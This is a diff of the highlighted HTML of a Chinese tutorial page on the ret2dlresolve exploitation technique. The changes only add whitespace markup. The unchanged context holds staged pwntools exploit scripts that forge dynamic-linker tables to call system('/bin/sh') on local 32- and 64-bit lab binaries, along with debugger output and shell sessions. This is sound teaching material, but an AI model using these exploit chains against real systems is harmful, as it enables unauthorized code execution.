@@ -6,7 +6,7 @@
 <span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
 <span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
 <span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为我们只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p> <ol> <li>修改 .dynamic 节中字符串表的地址为伪造的地址</li> <li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li> <li>在特定的位置读取 /bin/sh 字符串。</li> <li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。</li> </ol> <p>代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为我们只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p> <ol> <li>修改 .dynamic 节中字符串表的地址为伪造的地址</li> <li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li> <li>在特定的位置读取 /bin/sh 字符串。</li> <li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。</li> </ol> <p>代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;i386&quot;</span>
@@ -98,7 +98,7 @@
 <span class=nf>gef</span><span class=err>➤</span><span class=w>  </span><span class=no>pattern</span><span class=w> </span><span class=no>search</span><span class=w> </span><span class=mi>0x62616164</span>
 <span class=err>[+]</span><span class=w> </span><span class=nf>Searching</span><span class=w> </span><span class=err>&#39;</span><span class=mi>0x62616164</span><span class=err>&#39;</span>
 <span class=err>[+]</span><span class=w> </span><span class=nf>Found</span><span class=w> </span><span class=no>at</span><span class=w> </span><span class=no>offset</span><span class=w> </span><span class=mi>112</span><span class=w> </span><span class=p>(</span><span class=no>little-endian</span><span class=w> </span><span class=no>search</span><span class=p>)</span><span class=w> </span><span class=no>likely</span>
-</code></pre></div> <p>在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。</p> <h5 id=stage-1>stage 1<a class=headerlink href=#stage-1 title="Permanent link">&para;</a></h5> <p>在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步</p> <ol> <li>将栈迁移到 bss 段。</li> <li>通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。</li> </ol> <p>这里使用了 pwntools 中的 ROP 模块。具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。</p> <h5 id=stage-1>stage 1<a class=headerlink href=#stage-1 title="Permanent link">&para;</a></h5> <p>在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步</p> <ol> <li>将栈迁移到 bss 段。</li> <li>通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。</li> </ol> <p>这里使用了 pwntools 中的 ROP 模块。具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -174,7 +174,7 @@
 .plt:080483C6 ; ---------------------------------------------------------------------------
 .plt:080483C6                 push    20h ; &#39; &#39;
 .plt:080483CB                 jmp     sub_8048370
-</code></pre></div> <p>具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -241,7 +241,7 @@ Relocation<span class=w> </span>section<span class=w> </span><span class=s1>&#39
 0804a014<span class=w>  </span><span class=m>00000407</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>strlen@GLIBC_2.0
 0804a018<span class=w>  </span><span class=m>00000507</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>__libc_start_main@GLIBC_2.0
 0804a01c<span class=w>  </span><span class=m>00000607</span><span class=w> </span>R_386_JUMP_SLOT<span class=w>   </span><span class=m>00000000</span><span class=w>   </span>write@GLIBC_2.0
-</code></pre></div> <p>可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -312,7 +312,7 @@ Hex<span class=w> </span>dump<span class=w> </span>of<span class=w> </span>secti
 <span class=w>  </span>0x0804823c<span class=w> </span>1a000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>11000000</span><span class=w> </span>................
 <span class=w>  </span>0x0804824c<span class=w> </span>2c000000<span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>00000000</span><span class=w> </span><span class=m>11000000</span><span class=w> </span>,...............
 <span class=w>  </span>0x0804825c<span class=w> </span>0b000000<span class=w> </span>6c860408<span class=w> </span><span class=m>04000000</span><span class=w> </span><span class=m>11001000</span><span class=w> </span>....l...........
-</code></pre></div> <p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -554,7 +554,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
 0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
 0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
-</code></pre></div> <p>而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p> <p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。</p> <p>那自然的，我们就可以调用目标函数。</p> <p>这里，我们可以通过调整 base_stage 来达到相应的目的。</p> <ul> <li>首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。</li> <li>那么，这也就说明原先的符号表偏移少了对应的个数。</li> <li>因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p> <p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。</p> <p>那自然的，我们就可以调用目标函数。</p> <p>这里，我们可以通过调整 base_stage 来达到相应的目的。</p> <ul> <li>首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。</li> <li>那么，这也就说明原先的符号表偏移少了对应的个数。</li> <li>因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -625,7 +625,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ndx_addr:<span class=w> </span>0x80487c2
 <span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
 /bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
-</code></pre></div> <h5 id=stage-5>stage 5<a class=headerlink href=#stage-5 title="Permanent link">&para;</a></h5> <p>这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h5 id=stage-5>stage 5<a class=headerlink href=#stage-5 title="Permanent link">&para;</a></h5> <p>这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -693,7 +693,7 @@ ndx_addr:<span class=w> </span>0x80487c2
 <span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
 <span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
 /bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
-</code></pre></div> <p>事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。</p> <h5 id=stage-6>stage 6<a class=headerlink href=#stage-6 title="Permanent link">&para;</a></h5> <p>这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 <code>_dl_runtime_resolve</code> 函数最终是依赖函数名来解析目标地址的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。</p> <h5 id=stage-6>stage 6<a class=headerlink href=#stage-6 title="Permanent link">&para;</a></h5> <p>这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 <code>_dl_runtime_resolve</code> 函数最终是依赖函数名来解析目标地址的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
@@ -802,10 +802,10 @@ $<span class=w> </span>ls
 exp-pwntools.py<span class=w>        </span>roptool.py<span class=w>    </span>stage2.py<span class=w>    </span>stage5.py
 ld-linux.so.2<span class=w>           </span>roputils.pyc<span class=w>  </span>stage3.py<span class=w>    </span>stage6.py
 main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>stage4.py
-</code></pre></div> <h4 id=_3>基于工具伪造<a class=headerlink href=#_3 title="Permanent link">&para;</a></h4> <p>根据上面的介绍，我们应该可以理解这个攻击了。</p> <h5 id=roputil>Roputil<a class=headerlink href=#roputil title="Permanent link">&para;</a></h5> <p>下面我们直接使用 roputil 来进行攻击。代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>roputils</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>process</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>gdb</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>context</span>
+</code></pre></div> <h4 id=_3>基于工具伪造<a class=headerlink href=#_3 title="Permanent link">&para;</a></h4> <p>根据上面的介绍，我们应该可以理解这个攻击了。</p> <h5 id=roputil>Roputil<a class=headerlink href=#roputil title="Permanent link">&para;</a></h5> <p>下面我们直接使用 roputil 来进行攻击。代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>roputils</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=n>process</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=n>gdb</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=n>context</span>
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
 <span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
@@ -863,7 +863,7 @@ $<span class=w> </span>ls
 exp-pwntools.py<span class=w>        </span>roptool.py<span class=w>    </span>stage2.py<span class=w>    </span>stage5.py
 ld-linux.so.2<span class=w>           </span>roputils.pyc<span class=w>  </span>stage3.py<span class=w>    </span>stage6.py
 main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>stage4.py
-</code></pre></div> <h5 id=pwntools>pwntools<a class=headerlink href=#pwntools title="Permanent link">&para;</a></h5> <p>这里我们使用 pwntools 的工具进行攻击。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h5 id=pwntools>pwntools<a class=headerlink href=#pwntools title="Permanent link">&para;</a></h5> <p>这里我们使用 pwntools 的工具进行攻击。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_32&quot;</span><span class=p>)</span>
 <span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=p>)</span>
 <span class=n>dlresolve</span> <span class=o>=</span> <span class=n>Ret2dlresolvePayload</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>symbol</span><span class=o>=</span><span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;/bin/sh&quot;</span><span class=p>])</span>
@@ -891,7 +891,7 @@ $<span class=w> </span>ls
 exp-pwntools.py<span class=w>        </span>roptool.py<span class=w>    </span>stage2.py<span class=w>    </span>stage5.py
 ld-linux.so.2<span class=w>           </span>roputils.pyc<span class=w>  </span>stage3.py<span class=w>    </span>stage6.py
 main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>stage4.py
-</code></pre></div> <h3 id=full-relro>Full RELRO<a class=headerlink href=#full-relro title="Permanent link">&para;</a></h3> <p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p> <p>那有没有什么办法可以绕过这样的防护呢？请读者自己思考。</p> <h2 id=64>64 位例子<a class=headerlink href=#64 title="Permanent link">&para;</a></h2> <h3 id=no-relro_1>NO RELRO<a class=headerlink href=#no-relro_1 title="Permanent link">&para;</a></h3> <p>在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。</p> <ol> <li>在 bss 段伪造栈。栈中的数据为<ol> <li>修改 .dynamic 节中字符串表的地址为伪造的地址</li> <li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li> <li>在特定的位置读取 /bin/sh 字符串。</li> <li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li> </ol> </li> <li>栈迁移到 bss 段。</li> </ol> <p>由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h3 id=full-relro>Full RELRO<a class=headerlink href=#full-relro title="Permanent link">&para;</a></h3> <p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p> <p>那有没有什么办法可以绕过这样的防护呢？请读者自己思考。</p> <h2 id=64>64 位例子<a class=headerlink href=#64 title="Permanent link">&para;</a></h2> <h3 id=no-relro_1>NO RELRO<a class=headerlink href=#no-relro_1 title="Permanent link">&para;</a></h3> <p>在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。</p> <ol> <li>在 bss 段伪造栈。栈中的数据为<ol> <li>修改 .dynamic 节中字符串表的地址为伪造的地址</li> <li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li> <li>在特定的位置读取 /bin/sh 字符串。</li> <li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li> </ol> </li> <li>栈迁移到 bss 段。</li> </ol> <p>由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -904,7 +904,7 @@ main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>s
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
 <span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
 <span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1067,7 +1067,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
     0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
 0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
-</code></pre></div> <p>但经过精细的调节，我们还是避免破坏 .dynamic 节的内容</p> <ul> <li>修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30</li> <li>修改迁移后的栈的大小为 0x188</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>但经过精细的调节，我们还是避免破坏 .dynamic 节的内容</p> <ul> <li>修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30</li> <li>修改迁移后的栈的大小为 0x188</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1080,7 +1080,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
 <span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
 <span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1163,7 +1163,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
 06:0030│      0x600d48 ◂— 0x8000000000000006
 07:0038│      0x600d50 ◂— 0x0
-</code></pre></div> <p>由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level=&quot;debug&quot;</span>
 <span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
@@ -1176,7 +1176,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
 <span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
 <span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
-<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
     <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
     <span class=c1># rbx = 0</span>
     <span class=c1># rbp = 1, enable not to jump</span>
@@ -1250,7 +1250,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 [*] Switching to interactive mode
 $ ls
 exp-no-relro-stack-pivot.py  main_no_relro_64
